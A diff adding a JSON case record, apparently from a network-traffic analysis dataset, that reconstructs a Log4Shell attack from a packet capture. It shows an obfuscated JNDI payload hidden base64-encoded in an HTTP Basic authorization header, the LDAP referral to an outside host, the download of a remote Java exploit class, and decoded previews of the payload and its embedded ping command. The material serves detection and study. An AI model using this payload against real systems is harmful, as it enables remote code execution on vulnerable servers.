@@ -1,0 +1,111 @@
+{
+  "case_id": "log4shell_ldap_basic_auth_ev1_001",
+  "source_raw": "raw/01_sample_packet_ldap-basic-auth-ev1.json",
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:50172-172.17.0.3:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.293713000 UTC",
+          "position": "http_header.authorization_basic",
+          "payload": "GET /test HTTP/1.1\r\nHost: 172.17.0.3:8000\r\nUser-Agent: python-requests/2.25.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nAuthorization: Basic bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:54590-34.91.73.37:1389-tcp",
+      "protocol": "LDAP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 13,
+          "time": 0.01434,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.307946000 UTC",
+          "position": "ldap_search_request.base_dn",
+          "payload": "0o\u0002\u0001\u0002cM\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x\n\u0001\u0000\n\u0001\u0003\u0002\u0001\u0000\u0002\u0001\u0000\u0001\u0001\u0000\u000bobjectClass0\u0000 \u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1389-172.17.0.3:54590-tcp",
+      "protocol": "LDAP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 15,
+          "time": 0.02277,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.316376000 UTC",
+          "position": "ldap_search_result.reference",
+          "payload": "0Ä\u0002\u0001\u0002d¾\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0\u0016\u0004\rjavaClassName1\u0005\u0004\u0003foo0(\u0004\fjavaCodeBase1\u0018\u0004\u0016http://34.91.73.37:80/0$\u0004\u000bobjectClass1\u0015\u0004\u0013javaNamingReference0\"\u0004\u000bjavaFactory1\u0013\u0004\u0011ExploitN3Mwwy59tU"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:42082-34.91.73.37:80-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.318118000 UTC",
+          "position": "http_request.java_class_download",
+          "payload": "GET /ExploitN3Mwwy59tU.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:80-172.17.0.3:42082-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.322513000 UTC",
+          "position": "java_class_binary",
+          "payload": "JAVA_CLASS_BINARY cafebabe; contains class name and command execution indicators; snippet='Êþº¾\\x00\\x00\\x002\\x00=\\x01\\x00\\x11ExploitN3Mwwy59tU\\x07\\x00\\x01\\x01\\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\\x07\\x00\\x03\\x01\\x00\\x03cmd\\x01\\x00\\x12Ljava/lang/String;\\x01\\x00\\x06<init>\\x01\\x00\\x03()V\\x01\\x00\\x13java/io/IOException\\x07\\x00\\t\\x0c\\x00\\x07\\x00\\x08\\n\\x00\\x04\\x00\\x0b\\x01\\x00\\x0cjava/io/File\\x07\\x00\\r\\x01\\x00\\tseparator\\x0c\\x00\\x0f\\x00\\x06\\t\\x00\\x0e\\x00\\x10\\x01\\x00\\x01/\\x08\\x00\\x12\\x01\\x00\\x10java/lang/String\\x07\\x00\\x14\\x01\\x00\\x06equals\\x01\\x00'"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:8000-172.17.0.1:50172-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 112,
+          "time": 0.068868,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.362474000 UTC",
+          "position": "http_response",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "Dec 22, 2021 15:46:03.362548000 UTC",
+          "position": "http_response",
+          "payload": "This is the response"
+        }
+      ]
+    }
+  ],
+  "candidate_notes": [
+    {
+      "position": "http_header.authorization_basic",
+      "candidate_type": "base64",
+      "raw": "bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9",
+      "decoded_preview": "log4shell:${${::-j}ndi:ldap://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}"
+    },
+    {
+      "position": "ldap_path",
+      "candidate_type": "nested_base64",
+      "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+      "decoded_preview": "ping -c 10 1.1.1.1"
+    }
+  ]
+}
